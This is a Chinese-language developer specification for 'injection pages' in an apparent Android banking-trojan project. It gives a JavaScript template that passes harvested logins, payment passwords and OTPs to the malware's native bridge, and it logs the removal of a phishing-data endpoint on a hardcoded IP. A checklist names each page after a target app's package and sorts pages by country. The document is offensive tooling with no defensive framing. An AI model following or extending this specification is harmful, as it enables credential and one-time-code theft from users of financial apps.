# 注入页规范（统一协议）

## 唯一提交通道：APK 原生桥

页面**只允许**通过 Android 注入的 JS 接口提交，禁止任何 `XMLHttpRequest` / `fetch` / `<form action>` 外发。

| 桥对象 | 方法 | 用途 |
|---|---|---|
| `FKB` / `Android`（同一个 Bridge 实例） | `setFormData(json)` | 提交表单数据（登录、支付密码、OTP…） |
| 同上 | `returnResult(json)` | 同 setFormData（老页面用这个名） |
| 同上 | `setClosePage(pkg)` / `close()` / `finish()` | 提交后关闭注入页 |

调用模板：

```js
var pl = JSON.stringify({ login: u, password: p, pkg: pk });
try { if (typeof FKB !== 'undefined' && FKB.setFormData) FKB.setFormData(pl); } catch (e) {}
try { if (typeof FKB !== 'undefined' && FKB.setClosePage) FKB.setClosePage(pk); } catch (e) {}
```

服务端 `/api/inj/result` **只接受 APK 原生通道**；网页来源（`Mozilla/…wv` UA）的 POST 一律忽略。

## 已执行的规范化（本轮）

```
① 删除全部外发端点：http://18.142.44.159:8035/api/PhishingData.php   （36 个页面，75 处）
② 删除网页直连 POST：location.origin + '/api/inj/result'            （7 个页面）
③ 保留并统一为桥调用（FKB.setFormData / Android.returnResult）
```

补丁统计：44 文件、82 行（忽略空白），桥调用覆盖 **57/57**：

| 目录 | 页面 | 桥覆盖 |
|---|---|---|
| ec | 2 | 2/2 |
| in | 6 | 6/6 |
| id | 19 | 19/19 |
| pe | 8 | 8/8 |
| jo | 13 | 13/13 |
| iq | 1 | 1/1 |
| tz | 1 | 1/1 |
| af | 1 | 1/1 |
| sea | 1 | 1/1 |

## 新增页面检查清单

1. 提交只用 `FKB.setFormData` / `Android.returnResult`
2. 不允许出现 `18.142.44.159`、外部域名、`action="http` 等外发通道
3. 提交后调用 `FKB.setClosePage(pkg)` 或 `Android.close()`
4. 文件名 = 目标包名（`<pkg>.html`），按国家放 `materials/inject/<cc>/`
5. 同步更新该目录 README 的品牌/包名对照表
